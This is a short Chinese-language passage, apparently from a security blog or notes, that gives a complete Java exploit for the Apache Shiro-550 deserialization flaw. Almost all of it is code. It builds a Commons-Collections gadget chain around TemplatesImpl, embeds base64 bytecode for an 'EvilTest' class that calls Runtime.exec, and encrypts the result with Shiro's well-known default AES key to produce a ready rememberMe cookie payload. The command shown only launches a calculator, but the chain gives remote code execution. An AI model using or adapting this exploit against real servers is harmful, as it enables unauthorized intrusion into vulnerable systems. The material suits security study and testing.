## payload

因为不能出现`Transformer`数组，所以直接调用`invokerTransformer`来执行`TemplatesImpl`的`newTransformer`方法，恶意加载字节码

```java
public class Shiro550{
    public static void main(String[] args) throws Exception {
        //byte[] payload = new CC2().getPayload();
        //byte[] payload=new CB1().getPayload();
        //byte[] payload=new Test().getPayload();
        byte[] payload=new CC6().getPayload();
        // AES加密
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        byte[] byteKey = Base64.getDecoder().decode(key);
        AesCipherService aesCipherService = new AesCipherService();
        byte[] result = aesCipherService.encrypt(payload, byteKey).getBytes();

        System.out.println(new String(Base64.getEncoder().encode(result)));
    }
}
class CC6 implements Serializable{
    private static void setFieldValue(Object obj,String name,Object value) throws Exception{
        Field field=obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static byte[] getPayload() throws Exception{
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==");
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_name","z3eyond");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer transformer=new InvokerTransformer("toString",null,null);
        HashMap innerMap=new HashMap();
        Map lazyMap=LazyMap.decorate(innerMap,transformer);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,templates);
        HashMap expMap = new HashMap();
        expMap.put(tiedMapEntry,"z3eyond");
        lazyMap.remove(templates);
        setFieldValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
        return barr.toByteArray();
    }
}
```

